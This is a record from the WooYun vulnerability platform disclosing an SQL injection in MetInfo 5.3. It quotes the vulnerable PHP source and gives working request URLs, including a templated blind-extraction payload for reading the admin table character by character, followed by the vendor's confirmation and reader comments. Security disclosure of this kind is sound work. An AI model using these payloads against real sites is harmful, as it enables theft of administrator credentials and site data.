{"id": 46283, "wybug_id": "wooyun-2015-0119166", "wybug_title": "MetInfo5.3 最新版本SQL注射(无限制全站信息获取)", "wybug_corp": "MetInfo", "wybug_author": "魔鬼的步伐", "wybug_date": "2015-06-09 10:55", "wybug_open_date": "2015-09-07 11:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向公众公开  简要描述： MetInfo5.3 最新版本SQL注射(无限制全站信息获取)  能否打个雷 详细说明：  listmod.php:\n<?phprequire_once substr(dirname(__FILE__), 0, -6).'common.inc.php';require_once '../include/global/pseudo.php';if($dbname!=$met_download&&$dbname!=$met_img&&$dbname!=$met_news&&$dbname!=$met_product){okinfo('../404.html');exit();}if($class_list[$class1]['module']>=100||($class1==0&&$class2==0&&$class3==0)||$class1==10001){\tif($search==\"search\"){\t\t\t$search_module=$imgproduct=='product'?3:5;\t\tif($searchtype)$search_module=$searchtype;\t\t$query=\"select * from $met_column where module='$search_module' and (classtype=1 or releclass!=0) and lang='$lang' order by no_order ASC,id ASC\";\t\t$search_coloumn=$db->get_all($query);\t\t$class1=$search_coloumn[0]['id'];\t}else{\t\t\t\tif($imgproduct){\t\t\t$ipmd = $imgproduct=='product'?100:101;\t\t\tif($imgproduct=='product'){$class1=$productlistid;}\t\t\telse{$class1=$imglistid;}\t\t}\t}}else{\tif(!$class1){\t\tif(!$class2){$class2=$class_list[$class3]['bigclass'];}\t\t$class1=$class_list[$class2]['bigclass'];\t}}\tif($met_member_use){\t$classaccess=$class3?$class3:($class2?$class2:$class1);\t$classaccess= $db->get_one(\"SELECT * FROM $met_column WHERE id='$classaccess'\");\t$metaccess=$classaccess['access'];}require_once '../include/head.php';if($class1){if(!is_array($class_list[$class1]))okinfo('../404.html');}$pseudos=$db->get_one(\"select * from $met_column where filename='$class2' and lang='$lang'\");if($pseudos){$class2=$pseudos[id];}if($class2){\tif(!is_array($class_list[$class2])){\t\t\tokinfo('../404.html');\t}\telse{\t\tif($class_list[$class2]['bigclass']!=$class1){\t\t\tokinfo('../404.html');\t\t}\t}}if($class3){\tif(!is_array($class_list[$class3])){\t\tokinfo('../404.html');\t}\telse{\t\tif($class_list[$class3]['bigclass']!=$class2){\t\t\tokinfo('../404.html');\t\t}\t}}$class1_info=$class_list[$class1]['releclass']?$class_list[$class_list[$class1]['releclass']]:$class_list[$class1];$class2_info=$class_list[$class1]['releclass']?$class_list[$class1]:$class_list[$class2];$class3_info=$class_list[$class1]['releclass']?$class_list[$class2]:$class_list[$class3];if(!is_array($class1_info))okinfo('../404.html');$class1sql=\" class1='$class1' \";if($class1&&!$class2&&!$class3){\tforeach($module_list2[$class_list[$class1]['module']] as $key=>$val){\t\tif($val['releclass']==$class1){\t\t\t$class1re.=\" or class1='$val[id]' \";\t\t}\t}\tif($class1re){\t\t$class1sql='('.$class1sql.$class1re.')';\t}}if($imgproduct){\t$ipcom = $imgproduct=='product'?$productcom:$imgcom;\t$serch_sql .=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')\";\tif($ipcom=='com')$serch_sql .= \" and com_ok=1\";    if($class1 && $class_list[$class1]['module']<>$ipmd&&$class1!=10001){\t\t$serch_sql .= ' and (('.$class1sql;\t}else{\t\t$serch_sql .= ' and ((1=1';\t}}else{\t$serch_sql=\" where lang='$lang' {$mobilesql} and (recycle='0' or recycle='-1')  and (( $class1sql \";}if($class2)$serch_sql .= \" and class2='$class2'\";if($class3)$serch_sql .= \" and class3='$class3'\";$serch_sql .= \" )\"; if($imgproduct=='product'){$serch_sql .= \" or (\"; $serch_sql .= \" classother REGEXP '/|-{$class1}-\"; $serch_sql .= $class2?\"{$class2}-\":\"[0-9]*-\";$serch_sql .= $class3?\"{$class3}-|/'\":\"[0-9]*-|/'\";$serch_sql .= \" )\"; }$serch_sql .= \" )\"; if($search==\"search\" && $mdmendy){ \t$dbparaname = $mdname=='product'?$product_paralist:($mdname=='download'?$download_paralist:$img_paralist);\tif($searchtype){\t\tif($title<>''){\t\t\t$serch_sql .= \" and title='\".trim($title).\"' \"; \t\t\t$serchpage .= \"&title=\".trim($title); \t\t}\t\tforeach($dbparaname as $key=>$val){\t\t\t$paratitle=$$val['para'];\t\t\tif($val['type']==4 and intval($page<1)){\t\t\t\t$paratitle=\"\";\t\t\t\tforeach($para_select[$val[id]] as $key=>$val1){\t\t\t\t\t$parasel=\"para\".$val['id'].\"_\".$val1[id];\t\t\t\t\tif(trim($$parasel)<>'')$paratitle.=$$parasel.\"-\";\t\t\t\t}\t\t\t\tif(trim($paratitle)<>'')$paratitle=substr($paratitle, 0, -1);\t\t\t}\t\t\tif(trim($paratitle)<>''){\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val[id]' and $met_plist.listid='$dbname.id and' $met_plist.info='\".trim($paratitle).\"') \"; \t\t\t\t$serchpage .= \"&\".$val['para'].\"=\".trim($paratitle);\t\t\t}\t\t}\t}else{\t\tif($title<>''){\t\t\t$serch_sql .= \" and title like '%\".trim($title).\"%'\"; \t\t\t$serchpage .= \"&title=\".trim($title); \t\t}\t\tif($content<>''){\t\t\tif($imgproduct && $metadmin['productother']){\t\t\t\t$serch_sql .= \" and ((content like '%\".trim($content).\"%' or content1 like '%\".trim($content).\"%' or content2 like '%\".trim($content).\"%' or content3 like '%\".trim($content).\"%' or content4 like '%\".trim($content).\"%' or title like '%\".trim($content).\"%')\"; \t\t\t}else{\t\t\t\t$serch_sql .= \" and ((content like '%\".trim($content).\"%' or title like '%\".trim($content).\"%') or (title like '%\".trim($content).\"%') \"; \t\t\t}\t\t\t$serchpage .= \"&content=\".trim($content); \t\t}\t\tforeach($dbparaname as $key=>$val){\t\t\t$paratitle=$$val['para'];\t\t\tif($val['type']==4){\t\t\t\tif(!$paratitle){\t\t\t\t\t$paratitle=\"\";\t\t\t\t\tforeach($para_select[$val['id']] as $key=>$val1){\t\t\t\t\t\t$parasel=\"para\".$val['id'].\"_\".$val1['id'];\t\t\t\t\t\tif(trim($$parasel)<>'')$paratitle.=$$parasel.\"-\";\t\t\t\t\t}\t\t\t\t\tif(trim($paratitle)<>'')$paratitle=substr($paratitle, 0, -1);\t\t\t\t\tif(trim($paratitle)<>''){\t\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3  and $met_plist.paraid='$val[id]' and $met_plist.listid=$dbname.id and $met_plist.info like'%\".trim($paratitle).\"%') \";  \t\t\t\t\t\t$serchpage .= \"&\".$val['para'].\"=\".trim($paratitle);\t\t\t\t\t}\t\t\t\t}else{\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val[id]' and $met_plist.listid=$dbname.id and $met_plist.info like'%\".trim($paratitle).\"%') \";  \t\t\t\t\t$serchpage .= \"&\".$val['para'].\"=\".trim($paratitle);\t\t\t\t}\t\t\t}else{\t\t\t\tif(trim($paratitle)<>''){\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val[id]' and $met_plist.listid=$dbname.id and $met_plist.info = '$paratitle') \";  \t\t\t\t\t$serchpage .= \"&\".$val['para'].\"=\".trim($paratitle);\t\t\t\t}\t\t\t}\t\t\t\t\t}\t\t//5.0.4\t\t\tif($content<>'')$serch_sql .= \" or exists(select $met_plist.id from $met_plist inner join $met_parameter on $met_plist.paraid=$met_parameter.id where $met_plist.module=3 and $met_parameter.type<>5 and $met_plist.listid=$dbname.id and $met_plist.info like'%\".trim($content).\"%')) \";\t\t//价格搜索\t\tforeach($dbparaname as $key=>$val2){\t\t\t$prices1=\"paraprice_\".$val2['id'];\t\t\t$prices=$$prices1;\t\t\tif($prices){\t\t\t\t\tif(!strstr($prices, \"-\")){\t\t\t\t\t\tpreg_match('/([0-9\\.]+)/',$prices,$result);\t\t\t\t\t\t$results=$result[0];\t\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val2[id]' and $met_plist.listid=$dbname.id and $met_plist.info > $results) \"; \t\t\t\t\t\t$serchpage .= \"&\".$prices1.\"=\".trim($$prices1);\t\t\t\t\t}else{\t\t\t\t\t\t$prices_sql=explode('-',$prices);\t\t\t\t\t\tpreg_match('/([0-9\\.]+)/',$prices_sql[1],$result);\t\t\t\t\t\t$results=$result[0];\t\t\t\t\t\t$serch_sql .= \" and exists(select * from $met_plist where module=3 and $met_plist.paraid='$val2[id]' and $met_plist.listid=$dbname.id and $met_plist.info > $prices_sql[0] and $met_plist.info < $results) \"; \t\t\t\t\t\t$serchpage .= \"&\".$prices1.\"=\".trim($$prices1);\t\t\t\t\t}\t\t\t\t\t\t\t}\t\t}\t}} if($mdmendy)$serchpage .= \"&searchtype=\".$searchtype;if($met_member_use==2)$serch_sql .= \" and access<=$metinfo_member_type\";$order_sql=$class3?list_order($class_list[$class3]['list_order']):($class2?list_order($class_list[$class2]['list_order']):list_order($class_list[$class1]['list_order']));$order_sql=($search==\"search\" && $mdmendy)?\" order by top_ok desc,com_ok desc,no_order desc,updatetime desc,id desc\":$order_sql;$order_sql=$order_sql==''?\" order by top_ok desc,com_ok desc,no_order desc,updatetime desc,id desc\":$order_sql;if($mdname=='news'||$mdname=='product'||$mdname=='download'||$mdname=='img'||$mdname=='job'){\t\t$serch_sql .=\" and displaytype='1'\";}$serch_sql .= \" and addtime<='{$m_now_date}'\";$total_count = $db->counter($dbname, \"$serch_sql\", \"*\");require_once '../include/pager.class.php';    $page = (int)$page;\tif($page_input){$page=$page_input;}    $list_num=$dbname_list;    $rowset = new Pager($total_count,$list_num,$page);    $from_record = $rowset->_offset();\t$page = $page?$page:1;\t$query = \"SELECT * FROM $dbname $serch_sql $order_sql LIMIT $from_record, $list_num\";\n看到最后一行:$serch_sql  怎么做能让这个没有在上面给初始化，这就是我们要做的通过调试：我们的知 控制它是否初始化的另一个变量为imgproduct当这个变量非search的任意字符的时候，导致serch_sql 不能进行初始化我们发送url:http://localhost/MetInfo5.3/news/news.php?lang=cn&class2=5&serch_sql=xxxxxxxxx&imgproduct=xxxx抓取到的sql为：SELECT * FROM met_news xxxxxxxxx where lang='cn'  and (recycle='0' or recycle='-1') and (( class1='2'  and class2='5' ) ) and displaytype='1' and addtime<='2015-06-09 03:26:14'  order by top_ok desc,no_order desc,updatetime desc,id desc LIMIT 0, 8此处正好位于met_news 后面我们进行测试：如果我们想得到met_app表里面的数据我们的数据构造是:SELECT * FROM met_news as a join met_app as b where if(ascii(substr(a.id,1,1))=49,1,0) limit 0,1\n\n这里id是1 所以ascii为49\n\n当id以2开头的有这么多，所以就全部获取出来了我们传递一个不存在的id：\n\n这样一来就等于没有数据，通过上面的分析，我们就可以通过这一张表去猜测，其他任何一张表的信息：发送url:http://localhost/MetInfo5.3/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1-- sd&imgproduct=xxxx    我们去猜测admin表，如果admin表里面的admin_id 的第一个字母为a的话，那么页面里面有值\n\n这样一来 比sql注入更为简单了97那个位置，然后在判断第二位，再穷聚 自然就爆表了更改pyloadhttp://localhost/MetInfo5.3/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,$p,1))=$num,1,0) limit 0,1-- sd&imgproduct=xxxx 然后只需要判断页面是否有数据，本例中为“为什么企业要建多国语言网站？”后面的测试代码 是php简单写的 ，比较容易超时，大晚上的 没个python环境，真苦恼。。。。。。大牛们 去补充python脚本吧   漏洞证明：     修复方案：     版权声明：转载请注明来源 魔鬼的步伐@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-09 11:07 厂商回复： 是系统BUG，后续版本中会修复问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-09 10:57 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:81        )\t\t \n  关注！    \n     2015-06-09 11:05 |    \t\t白开水 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:21        | 苍茫的天涯是我的爱~)\t\t \n  mark!    \n     2015-06-09 11:21 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:41        | 答案)\t\t \n  关注    \n     2015-06-09 11:35 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  我靠，今天提交的立马就有奖金了，这速度    \n     2015-06-09 12:12 |    \t\tB1gstar \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:6        | 向各位学习来了。)\t\t \n  @f4ckbaidu 真的应该这样，好像有人说360这点比较好     \n     2015-06-09 12:22 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  @B1gstar 360奖金都是月底发    \n     2015-06-09 13:11 |    \t\t姗姗来迟 \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:5        | coffeesafe的小号)\t\t \n  我想问3-31号的奖金什么时候发    \n     2015-06-09 13:13 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 学姿势，学思路。)\t\t \n  牛叉。    \n     2015-08-13 11:25 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:81        )\t\t \n  学习了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}